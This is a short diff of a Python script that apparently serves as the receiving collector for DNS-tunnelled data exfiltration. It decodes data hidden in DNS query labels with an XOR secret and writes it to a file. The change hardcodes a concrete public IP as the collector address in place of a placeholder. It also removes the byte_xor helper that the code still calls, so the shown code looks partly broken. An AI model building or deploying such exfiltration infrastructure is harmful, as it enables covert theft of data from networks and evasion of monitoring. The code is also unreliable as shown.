@@ -8,7 +8,7 @@ import sys
 
 n_times_6_bytes = 0
 secret_bytes: bytes
-collector_ip = '1.1.1.1'  # FIXME
+collector_ip = '20.79.206.157'  # FIXME
 end_file = False
 file = ""
 
@@ -26,7 +26,7 @@ def receive_data(udps, file):
     answer = dnsD.reply()
     domain = b'.'.join(labels)
     domain = domain.decode()
-    secret = byte_xor(secret, bytes(domain[:6]))
+    secret = byte_xor(secret, bytes(domain[:6], "utf-8"))
     return data, addr, type, domain, answer, secret
 
 
@@ -54,10 +54,6 @@ def decode_data(data, file):
         file.close()
         end_file = True
     return data, secret
-
-
-def byte_xor(ba1, ba2):
-    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])
 
 
 def main_collector_loop(udps):
